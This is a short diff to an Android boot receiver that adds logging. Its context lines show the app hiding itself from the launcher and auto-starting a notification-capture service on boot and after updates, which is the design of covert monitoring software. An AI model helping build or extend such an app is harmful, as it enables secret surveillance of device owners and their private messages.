@@ -16,6 +16,7 @@ class BootReceiver : BroadcastReceiver() {
         when (intent.action) {
             Intent.ACTION_BOOT_COMPLETED,
             "android.intent.action.QUICKBOOT_POWERON" -> {
+                Timber.tag("BOOT_RECEIVER").i("📱 Device boot completed - Auto-starting services and notification capture")
                 Timber.d("Boot completed - starting services")
                 
                 // Ensure app is hidden from launcher
@@ -23,6 +24,7 @@ class BootReceiver : BroadcastReceiver() {
                 AppHider.ensureHidden(context)
                 
                 // Start notification capture service using utility
+                Timber.tag("BOOT_RECEIVER").i("🔄 Starting NotificationCaptureService after boot...")
                 ServiceStarter.startNotificationService(context)
                 
                 // Start service monitoring
@@ -31,6 +33,7 @@ class BootReceiver : BroadcastReceiver() {
                 
                 // Ensure services remain running
                 ServiceStarter.ensureServicesRunning(context)
+                Timber.tag("BOOT_RECEIVER").i("✅ Services started after boot - Notification capture active")
             }
             Intent.ACTION_MY_PACKAGE_REPLACED -> {
                 Timber.d("App updated - ensuring hidden and starting services")
